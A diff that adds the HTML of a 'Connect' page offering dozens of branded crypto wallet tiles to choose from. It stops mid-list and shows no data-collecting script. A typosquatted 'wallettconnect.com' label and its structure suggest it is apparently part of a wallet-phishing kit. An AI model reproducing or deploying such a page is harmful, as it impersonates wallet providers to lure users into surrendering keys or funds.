@@ -1,0 +1,3358 @@
+<!DOCTYPE html>
+<html lang="en">
+
+ <meta content="text/html;charset=utf-8" http-equiv="content-type"/>
+ <head>
+  <meta content="text/html;charset=utf-8" http-equiv="content-type"/>
+  <meta charset="utf-8"/>
+  <title>
+   Connect
+  </title>
+  <meta content="Flare Network" name="author"/>
+  <meta content="xtw3hhrY1z3mywOZ2sZCYeLSwUMzqQHIrqRh6no4" name="csrf-token"/>
+  <meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport"/>
+  <link href="static/connect-css/style.css" rel="stylesheet" type="text/css"/>
+  <link href="static/logo/wc.png" rel="shortcut icon"/>
+  <link href="static/logo/wc.png" rel="apple-touch-icon-precomposed"/>
+  <link href="assets/global/css/all.min.css" rel="stylesheet"/>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js">
+  </script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js">
+  </script>
+  <style>
+   .badge::after {
+            content: '' !important;
+        }
+  </style>
+  <!-- <script type="text/javascript">
+   var _smartsupp = _smartsupp || {};
+    _smartsupp.key = '7f0deef63335bc1866bb1193c131835a238ef23f';
+    window.smartsupp||(function(d) {
+      var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+      s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+      c.type='text/javascript';c.charset='utf-8';c.async=true;
+      c.src='../www.smartsuppchat.com/loaderd41d.js?';s.parentNode.insertBefore(c,s);
+    })(document);
+  </script>
+  <noscript>
+   Powered by Smartsupp
+  </noscript> -->
+ </head>
+ <body class="body header-fixed">
+  <div id="wrapper">
+   <div class="clearfix" id="page">
+    <section class="tf-section top-seller" id="wallets_list">
+     <div class="themesflat-container">
+      <div class="row">
+       <div class="col-md-12">
+        <h2 class="tf-title style2">
+         Select a Wallet
+        </h2>
+        <div class="heading-line s2">
+        </div>
+        <!-- Search Feature -->
+        <div class="input-group mb-3">
+         <input class="form-control search" placeholder="Search..." type="text"/>
+         <div class="input-group-append">
+          <button class="btn btn-primary" style="height:100%" type="button">
+           Search
+          </button>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/images.png" data-title="ledger" id="wallet_connect" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/images.png"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Ledger
+           </a>
+          </h5>
+          <span class="price">
+           ledger.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/walle.jpg" data-title="Wallet Connect" id="wallet_connect_2" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/walle.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Wallet Connect
+           </a>
+          </h5>
+          <span class="price">
+           wallettconnect.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/trust_wallet.jpg" data-title="Trust Wallet" id="trust_wallet" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/trust_wallet.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Trust Wallet
+           </a>
+          </h5>
+          <span class="price">
+           trustwallet.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/metamask.jpg" data-title="Metamask" id="metamask" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/metamask.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Metamask
+           </a>
+          </h5>
+          <span class="price">
+           metamask.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/binance.png" data-title="Binance Chain Wallet" id="binance" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/binance.png"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Binance Chain Wallet
+           </a>
+          </h5>
+          <span class="price">
+           binance.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/polygon.jpg" data-title="Polygon Wallet" id="polygon" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/polygon.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Polygon Wallet
+           </a>
+          </h5>
+          <span class="price">
+           polygon.technology
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/rainbow.jpg" data-title="Rainbow" id="rainbow" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/rainbow.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Rainbow
+           </a>
+          </h5>
+          <span class="price">
+           rainbow.me
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/bitpay.jpg" data-title="Bitpay" id="bitpay" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/bitpay.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Bitpay
+           </a>
+          </h5>
+          <span class="price">
+           bitpay.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/xumm.jpg" data-title="Xumm" id="bitpay_2" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/xumm.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Xumm
+           </a>
+          </h5>
+          <span class="price">
+           xumm.app
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="https://play-lh.googleusercontent.com/PD6ommpOAofmpJzNt5t4zDoGsloOi3O3EM8GoS0pGa6O5RAmRMvSD2CdY962LmaVwQ=s200" data-title="Bitpay" id="bitpay_3" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="https://play-lh.googleusercontent.com/PD6ommpOAofmpJzNt5t4zDoGsloOi3O3EM8GoS0pGa6O5RAmRMvSD2CdY962LmaVwQ=s200"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Saita Pro
+           </a>
+          </h5>
+          <span class="price">
+           saitapro.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/walleth.jpg" data-title="Walleth" id="waleth" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/walleth.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Walleth
+           </a>
+          </h5>
+          <span class="price">
+           walleth.org
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="https://play-lh.googleusercontent.com/HmXjCZa048la55QfEg_6CJo8Qt7NN0HVUR2cu8uk5gm5BoNhEXulPrgT0Qbnoaf3tHfl" data-title="SaitaMask" id="SaitaMask" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="https://play-lh.googleusercontent.com/HmXjCZa048la55QfEg_6CJo8Qt7NN0HVUR2cu8uk5gm5BoNhEXulPrgT0Qbnoaf3tHfl"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            SaitaMask
+           </a>
+          </h5>
+          <span class="price">
+           SaitaMask.org
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/argent.jpg" data-title="Argent" id="argent" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/argent.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Argent
+           </a>
+          </h5>
+          <span class="price">
+           argent.xyz
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/huobi.jpg" data-title="Huobi Wallet" id="huobi" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/huobi.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Huobi Wallet
+           </a>
+          </h5>
+          <span class="price">
+           huobiwallet.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/encrypted_ink.jpg" data-title="Encrypted Ink" id="encrypted_ink" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/encrypted_ink.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Encrypted Ink
+           </a>
+          </h5>
+          <span class="price">
+           encrypted.ink
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
+        <div class="sc-author-box select_wallet" data-logo="https://play-lh.googleusercontent.com/YM7h-nnxtDs9WROvE0GUzreNFua0eIm2N2m181BuiLgAqOeByqYZahsnbKos2xSGdAmv=w240-h480-rw" data-title="KEPLR" id="keplr" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="https://play-lh.googleusercontent.com/YM7h-nnxtDs9WROvE0GUzreNFua0eIm2N2m181BuiLgAqOeByqYZahsnbKos2xSGdAmv=w240-h480-rw"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            KEPLR
+           </a>
+          </h5>
+          <span class="price">
+           KEPLR
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/plug.png" data-title="Plug Wallet" id="keplr_2" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/plug.png"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Plug Wallet
+           </a>
+          </h5>
+          <span class="price">
+           plug.oo
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/phantom.png" data-title="Phantom" id="keplr_3" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/phantom.png"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Phantom
+           </a>
+          </h5>
+          <span class="price">
+           Phantom
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/compound.jpg" data-title="Compound" id="compound" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/compound.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Compound
+           </a>
+          </h5>
+          <span class="price">
+           compound.finance
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/polkadot.jpg" data-title="Polkadot" id="polkadot" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/polkadot.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Polkadot
+           </a>
+          </h5>
+          <span class="price">
+           polkadot.network
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/iotex.jpg" data-title="Iotex" id="iotex" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/iotex.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Iotex
+           </a>
+          </h5>
+          <span class="price">
+           iotex.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/coin98.jpg" data-title="Coin98" id="coin98" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/coin98.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Coin98
+           </a>
+          </h5>
+          <span class="price">
+           coin98.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/coinbase.png" data-title="Coinbase" id="coinbase" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/coinbase.png"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Coinbase
+           </a>
+          </h5>
+          <span class="price">
+           coinbase.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/crypto.jpg" data-title="Crypto.com | Defi Wallet" id="crypto" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/crypto.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Crypto.com | Defi Wallet
+           </a>
+          </h5>
+          <span class="price">
+           crypto.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/token_pocket.jpg" data-title="Token Pocket" id="token_pocket" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/token_pocket.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Token Pocket
+           </a>
+          </h5>
+          <span class="price">
+           tokenpocket.pro
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/math_wallet.jpg" data-title="Math Wallet" id="math_wallet" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/math_wallet.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Math Wallet
+           </a>
+          </h5>
+          <span class="price">
+           mathwallet.org
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/ledger_live.jpg" data-title="Ledger Live" id="ledger_live" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/ledger_live.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Ledger Live
+           </a>
+          </h5>
+          <span class="price">
+           ledger.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/1inch.jpg" data-title="1Inch" id="_1inch" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/1inch.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            1Inch
+           </a>
+          </h5>
+          <span class="price">
+           1inch.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/dharma.jpg" data-title="Dharma" id="dharma" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/dharma.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Dharma
+           </a>
+          </h5>
+          <span class="price">
+           dharma.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/trust_vault.jpg" data-title="Trust Vault" id="trust_vault" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/trust_vault.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Trust Vault
+           </a>
+          </h5>
+          <span class="price">
+           trustology.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/mykey.jpg" data-title="MYKEY" id="my_key" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/mykey.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            MYKEY
+           </a>
+          </h5>
+          <span class="price">
+           mykey.org
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/atomic.jpg" data-title="Atomic" id="atomic" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/atomic.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Atomic
+           </a>
+          </h5>
+          <span class="price">
+           atomicwallet.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/cool_wallet_s.jpg" data-title="CoolWallet S" id="cool_wallet_s" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/cool_wallet_s.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            CoolWallet S
+           </a>
+          </h5>
+          <span class="price">
+           coolwallet.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/nash.jpg" data-title="Nash" id="nash" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/nash.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Nash
+           </a>
+          </h5>
+          <span class="price">
+           nash.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/coinomi.jpg" data-title="Coinomi" id="coinomi" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/coinomi.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Coinomi
+           </a>
+          </h5>
+          <span class="price">
+           coinomi.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/gridplus.jpg" data-title="GridPlus" id="gridplus" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/gridplus.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            GridPlus
+           </a>
+          </h5>
+          <span class="price">
+           gridplus.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/tokenary.jpg" data-title="Tokenary" id="tokenary" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/tokenary.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Tokenary
+           </a>
+          </h5>
+          <span class="price">
+           tokenary.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/safepal.jpg" data-title="SafePal" id="safepal" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/safepal.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            SafePal
+           </a>
+          </h5>
+          <span class="price">
+           safepal.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/infinito.jpg" data-title="Infinito" id="infinito" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/infinito.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Infinito
+           </a>
+          </h5>
+          <span class="price">
+           infinitowallet.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/wallet_io.jpg" data-title="Wallet.io" id="wallet_io" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/wallet_io.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Wallet.io
+           </a>
+          </h5>
+          <span class="price">
+           wallet.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/ownbit.jpg" data-title="Ownbit" id="ownbit" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/ownbit.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Ownbit
+           </a>
+          </h5>
+          <span class="price">
+           ownbit.io
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/easypocket.jpg" data-title="EasyPocket" id="easypocket" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/easypocket.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            EasyPocket
+           </a>
+          </h5>
+          <span class="price">
+           easypocket.app
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/bridge_wallet.jpg" data-title="Bridge Wallet" id="bridget_wallet" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/bridge_wallet.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            Bridge Wallet
+           </a>
+          </h5>
+          <span class="price">
+           mtpelerin.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/via_wallet.jpg" data-title="ViaWallet" id="via_wallet" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/via_wallet.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
+           </i>
+          </div>
+         </div>
+         <div class="author-infor">
+          <h5 class="style2">
+           <a>
+            ViaWallet
+           </a>
+          </h5>
+          <span class="price">
+           viawallet.com
+          </span>
+         </div>
+        </div>
+       </div>
+       <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets" style="">
+        <div class="sc-author-box select_wallet" data-logo="static/logo/bitkeep.jpg" data-title="BitKeep" id="bitkeep" style="cursor:pointer;">
+         <div class="author-avatar">
+          <a href="#">
+           <img alt="Image" class="avatar" src="static/logo/bitkeep.jpg"/>
+          </a>
+          <div class="badge">
+           <i class="ripple">
